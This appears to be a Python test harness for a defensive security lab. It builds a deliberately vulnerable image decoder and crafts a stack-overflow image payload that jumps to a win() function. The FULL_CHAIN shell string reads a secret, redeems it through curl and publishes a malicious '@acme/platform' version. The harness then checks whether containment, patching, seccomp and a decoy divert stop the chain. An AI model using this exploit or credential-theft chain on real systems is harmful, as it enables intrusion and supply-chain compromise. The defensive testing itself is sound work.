#!/usr/bin/env python3
"""Docker-free host harness for the maple v2 estate.

The published experiment needs Docker for user isolation, seccomp and two networks. This runs
the SAME services as localhost processes so the deterministic matrix (and a small live loop)
can be rerun on a host without Docker. What it keeps real:

  - the real vulnerable decoder (compiled -no-pie -fno-stack-protector) and the vpatch build;
  - a real control-flow hijack that really execve()s as the service user;
  - real seccomp-bpf (if compiled in) and real vpatch;
  - the real edge fingerprint/divert logic and the real app/identity/registry/agent services;
  - rak containment enforced by Landlock (see app/rakwrap.c), the same policy shape as
    rak-agent's compile_policy: fs allowlist + TCP deny on the untrusted decoder process.

What it cannot model on one host, and therefore does NOT claim:
  - Docker network namespaces (attacker/app/maplepot isolation). The wall-off is enforced by
    rak/Landlock, not by a separate network. The decoy->real lateral-move bug is tested at the
    credential layer (APP-CANARY scoping) instead.
"""
import http.client, json, os, re, shutil, signal, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
APP_SRC = os.path.join(HERE, "app", "estate_app.py")
EDGE_SRC = os.path.join(HERE, "edge", "edge_proxy.py")
DEC_SRC = os.path.join(HERE, "app", "native", "vuln_decoder.c")
BASE = os.environ.get("MAPLE_BASE", "/tmp/maple-rerun")
RUN = os.path.join(BASE, "run")
IMAGES = os.path.join(BASE, "images")
SEC_REAL = os.path.join(BASE, "secrets", "real")
SEC_DECOY = os.path.join(BASE, "secrets", "decoy")
FOOTHOLD = os.path.join(BASE, "foothold")
APP_PORT, POT_PORT, EDGE_PORT = 18081, 18082, 18080
REAL_TOKEN = "REAL-FORUM-SESS-a1b2c3"
CANARY_TOKEN = "CANARY-TRIPWIRE-x9y8z7"
BROWSER_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")

PROCS = {}


# ---------------------------------------------------------------- build/setup
def build():
    os.makedirs(RUN, exist_ok=True)
    for name, extra in (("vuln_decoder", []), ("vuln_decoder_vpatch", ["-DVPATCH"])):
        out = os.path.join(RUN, name)
        subprocess.run(["gcc", "-no-pie", "-fno-stack-protector", "-O0", *extra,
                        "-o", out, DEC_SRC, "-lseccomp"], check=True)
    subprocess.run(["cc", "-O2", "-o", os.path.join(RUN, "rakwrap"),
                    os.path.join(HERE, "app", "rakwrap.c")], check=True)
    # attacker foothold: open-source component only (same build -> same win() address)
    os.makedirs(FOOTHOLD, exist_ok=True)
    shutil.copy(DEC_SRC, os.path.join(FOOTHOLD, "vuln_decoder.c"))
    subprocess.run(["gcc", "-no-pie", "-fno-stack-protector", "-O0", "-o",
                    os.path.join(FOOTHOLD, "vuln_decoder"),
                    os.path.join(FOOTHOLD, "vuln_decoder.c"), "-lseccomp"], check=True)
    for d in (IMAGES, SEC_REAL, SEC_DECOY):
        os.makedirs(d, exist_ok=True)
    open(os.path.join(SEC_REAL, "forum"), "w").write(REAL_TOKEN)
    open(os.path.join(SEC_DECOY, "canary"), "w").write(CANARY_TOKEN)


def win_addr():
    out = subprocess.run(["nm", os.path.join(FOOTHOLD, "vuln_decoder")],
                         capture_output=True, text=True).stdout
    for line in out.splitlines():
        p = line.split()
        if len(p) == 3 and p[2] == "win":
            return int(p[0], 16)
    raise RuntimeError("win() not found")


def craft(path, sh_cmd):
    import struct
    win = win_addr()
    payload = b"A" * 64 + struct.pack("<Q", win) + sh_cmd.encode() + b"\x00"
    open(path, "wb").write(b"HEIF" + b"grid" + struct.pack("<I", len(payload)) + payload)


FULL_CHAIN = (r'S=$(cat $SECRET_PATH); '
              r'A=$(curl -s "$ESTATE_URL/idp/redeem?token=$S&to=app"|grep -o "APP-REAL-[a-z]*"); '
              r'curl -s "$ESTATE_URL/codex/instruct?session=$A&action=publish'
              r'&name=@acme/platform&version=4.2.2-evil" 1>&2; '
              r'echo HIJACKED-$(whoami) 1>&2')


# ---------------------------------------------------------------- processes
def _popen(name, args, env, cwd):
    log = open(os.path.join(BASE, f"{name}.log"), "w")
    PROCS[name] = subprocess.Popen(args, env=env, cwd=cwd, stdout=log, stderr=subprocess.STDOUT)


def _confined(args, allow, ports):
    """Model a container: confine the role process (and anything it execs, e.g. the decoder)
    to an fs allowlist + only its own TCP port. Landlock is inherited across fork/exec."""
    wrap = os.path.join(RUN, "rakwrap")
    env = dict(os.environ, RAK_ALLOW=allow, RAK_NET="allow", RAK_PORTS=ports)
    return [wrap] + args, env


def stop_all():
    for p in PROCS.values():
        try:
            p.send_signal(signal.SIGTERM)
        except Exception:
            pass
    for p in PROCS.values():
        try:
            p.wait(timeout=5)
        except Exception:
            p.kill()
    PROCS.clear()
    time.sleep(0.3)


def start(deception=True, app_env=None, edge_env=None):
    stop_all()
    # belt-and-braces: kill any stragglers from a previous scenario so a stale app
    # (e.g. one still holding RAK) cannot answer the next scenario's requests.
    for pat in ("estate_app.py", "edge_proxy.py"):
        subprocess.run(["pkill", "-f", pat], capture_output=True)
    time.sleep(0.5)
    env = dict(os.environ, PORT=str(APP_PORT), SECRET_PATH=os.path.join(SEC_REAL, "forum"),
               IMAGE_DIR=IMAGES)
    env.update(app_env or {})
    # baseline container-equivalent view for the real app (and the decoder it spawns):
    # its own source + its own secret + the image dir, and only its own port.
    base_allow = f"/usr:/bin:/lib:/lib64:/etc:/dev:{RUN}:{IMAGES}:{os.path.dirname(APP_SRC)}"
    args, cenv = _confined([sys.executable, APP_SRC], base_allow + ":" + SEC_REAL, str(APP_PORT))
    cenv.update(env)
    _popen("app", args, cenv, RUN)
    pot_env = dict(os.environ, PORT=str(POT_PORT), DECOY="1",
                   SECRET_PATH=os.path.join(SEC_DECOY, "canary"), IMAGE_DIR=IMAGES)
    pargs, penv = _confined([sys.executable, APP_SRC], base_allow + ":" + SEC_DECOY, str(POT_PORT))
    penv.update(pot_env)
    _popen("maplepot", pargs, penv, RUN)
    eenv = dict(os.environ, PORT=str(EDGE_PORT), APP_HOST=f"127.0.0.1:{APP_PORT}",
                MAPLEPOT_HOST=f"127.0.0.1:{POT_PORT}", DECEPTION="1" if deception else "0",
                EDGE_STATS_KEY="rerun-key")
    eenv.update(edge_env or {})
    _popen("edge", [sys.executable, EDGE_SRC], eenv, RUN)
    for _ in range(80):
        if app_state() is not None and http_ok(EDGE_PORT, "/"):
            return True
        time.sleep(0.25)
    return False


# ---------------------------------------------------------------- HTTP helpers
def http_req(port, method, path, headers=None, body=None, timeout=15):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    c.request(method, path, body=body, headers=headers or {})
    r = c.getresponse(); data = r.read()
    return r.status, dict(r.getheaders()), data


def http_ok(port, path):
    try:
        st, _, _ = http_req(port, "GET", path)
        return st == 200
    except Exception:
        return False


def app_state():
    try:
        st, _, data = http_req(APP_PORT, "GET", "/state")
        return json.loads(data) if st == 200 else None
    except Exception:
        return None


def reset_state():
    for port in (APP_PORT, POT_PORT):
        try:
            http_req(port, "GET", "/reset")
        except Exception:
            pass


def browser_upload(poc):
    st, hdrs, body = http_req(EDGE_PORT, "GET", "/", headers={"User-Agent": BROWSER_UA,
                                                              "Accept-Language": "en-US,en"})
    sid = re.search(r'sid=([a-f0-9]+)', hdrs.get("Set-Cookie", "")).group(1)
    token = re.search(r"content=([a-f0-9]+)", body.decode()).group(1)
    ck = {"Cookie": f"sid={sid}", "User-Agent": BROWSER_UA, "Accept-Language": "en-US,en"}
    http_req(EDGE_PORT, "GET", "/static/app.js", headers=ck)
    http_req(EDGE_PORT, "GET", "/static/style.css", headers=ck)
    time.sleep(0.45)
    st, _, resp = http_req(EDGE_PORT, "POST", "/upload",
                           headers={**ck, "X-Upload-Token": token,
                                    "Content-Type": "application/octet-stream"},
                           body=open(poc, "rb").read())
    try:
        return json.loads(resp)
    except Exception:
        return {"outcome": "PARSE-FAIL:" + resp.decode(errors="replace")[:200]}


def naive_upload(poc):
    st, _, resp = http_req(EDGE_PORT, "POST", "/upload",
                           headers={"User-Agent": "curl/8.5.0",
                                    "Content-Type": "application/octet-stream"},
                           body=open(poc, "rb").read())
    try:
        return json.loads(resp)
    except Exception:
        return {"outcome": "PARSE-FAIL"}


# ---------------------------------------------------------------- checks
PASS, FAIL = [], []


def check(name, ok, detail=""):
    (PASS if ok else FAIL).append(name)
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f"  -- {detail}" if detail and not ok else ""))


def compromised(state):
    if not state:
        return False
    pub = any(p.get("name") == "@acme/platform" for p in state.get("published", []))
    merged = any(m.get("path", "").startswith((".github/workflows/", "release/"))
                 for m in state.get("merges", []))
    return pub or merged


def main():
    print("== build ==")
    build()
    poc = os.path.join(BASE, "poc.heic")
    craft(poc, FULL_CHAIN)
    print(f"  decoder hijack image built ({os.path.getsize(poc)}B), win()={hex(win_addr())}")

    print("== baseline: exploit through the edge (deception OFF) ==")
    check("estate comes up", start(deception=False))
    dj = browser_upload(poc)
    check("browser-path upload hit the REAL app", dj.get("tag") == "real", str(dj))
    check("real control-flow hijack ran", "hijack" in dj.get("outcome", ""), str(dj))
    st = app_state()
    srcs = {a["source"] for a in st["alerts"]}
    check("D2 identity sensor fired", any(s.startswith("D2") for s in srcs), str(srcs))
    check("D5 connected-agent-hijack fired", any(s.startswith("D5") for s in srcs), str(srcs))
    check("D4 supply-chain fired", any(s.startswith("D4") for s in srcs), str(srcs))
    check("REAL core package published", compromised(st), str(st.get("published")))

    print("== containment fix: canary credential cannot mint on the REAL app ==")
    code, _, _ = http_req(APP_PORT, "GET",
                          "/registry/publish?app=APP-CANARY-x&name=@acme/platform&version=evil")
    check("APP-CANARY token rejected by real app (401)", code == 401, str(code))
    code, _, _ = http_req(APP_PORT, "GET",
                          f"/registry/publish?app={REAL_TOKEN}&name=@acme/platform&version=x")
    check("real token still authenticates (not over-blocked)", code == 200, str(code))

    print("== rak containment: hijack lands, secret read + egress denied ==")
    start(deception=False, app_env={"RAK": "1", "RAK_WRAP": os.path.join(RUN, "rakwrap")})
    dj = browser_upload(poc)
    check("hijack still lands under rak (bug not patched)", "hijack" in dj.get("outcome", ""), str(dj))
    err = " ".join(dj.get("decoder_stderr", []))
    check("rakwrap reported containment", "rakwrap" in err, err)
    check("secret read denied (Permission denied)", "Permission denied" in err, err)
    st = app_state()
    check("no compromise under rak", not compromised(st), str(st.get("published")))
    check("no account takeover under rak",
          not any(a["source"].startswith("D2") for a in st["alerts"]), str(st["alerts"]))

    print("== vpatch / seccomp still change behavior ==")
    start(deception=False, app_env={"DEFENSE": "vpatch"})
    dj = browser_upload(poc)
    check("vpatch rejects the overflow (rc=2)", dj.get("rc") == 2, str(dj))
    start(deception=False, app_env={"SECCOMP": "1"})
    dj = browser_upload(poc)
    check("seccomp kills the hijack (negative rc)", isinstance(dj.get("rc"), int) and dj["rc"] < 0, str(dj))

    print("== deception: naive client diverted + divert signal reaches Blue ==")
    start(deception=True)
    nj = naive_upload(poc)
    check("plain-curl upload diverted to maplepot", nj.get("tag") == "maplepot", str(nj))
    st = app_state()
    check("real app did NOT get compromised", not compromised(st), str(st.get("published")))
    check("D6/edge-divert alert wired to the real app",
          any(a["source"].startswith("D6") for a in st["alerts"]), str(st["alerts"]))
    # browser-path client still reaches real app under deception
    bj = browser_upload(poc)
    check("human-shaped client still reaches the REAL app", bj.get("tag") == "real", str(bj))

    stop_all()
    print(f"\n== RESULT: {len(PASS)} passed, {len(FAIL)} failed ==")
    if FAIL:
        print("  FAILED:", FAIL)
        return 1
    print("  All rerun checks verified deterministically (no Docker).")
    return 0


if __name__ == "__main__":
    sys.exit(main())